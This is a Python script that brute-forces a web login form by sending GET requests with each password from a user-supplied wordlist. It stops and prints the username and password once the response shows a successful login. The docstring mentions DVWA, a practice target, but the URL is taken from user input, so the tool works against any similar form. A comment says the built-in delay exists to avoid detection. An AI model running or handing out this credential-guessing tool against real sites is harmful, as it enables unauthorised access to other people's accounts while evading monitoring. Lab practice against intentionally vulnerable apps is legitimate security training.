import requests
import time

def brute_force_login(url, username, password_list):
    """Attempts brute-force attack using GET requests for DVWA login."""
    
    session = requests.Session()
    
    for password in password_list:
        response = session.get(url, params={"username": username, "password": password, "Login": "Login"})

        # Detect successful login by checking session persistence
        if "Logout" in response.text or response.history:
            print(f"{username}:{password}")  # Display only the correct password
            return  # Stop after finding the correct password
        
        time.sleep(2)  # Delay to prevent detection

    print("No valid credentials found.")

def main():
    """Handles user input and starts the brute-force attack."""
    url = input("Enter the login URL: ")
    username = input("Enter the username: ")
    password_file = input("Enter the path to the password file (e.g., passwords.txt): ")

    try:
        with open(password_file, "r") as f:
            password_list = f.read().splitlines()
    except FileNotFoundError:
        print(f"Error: Password file '{password_file}' not found.")
        return

    brute_force_login(url, username, password_list)

if __name__ == "__main__":
    main()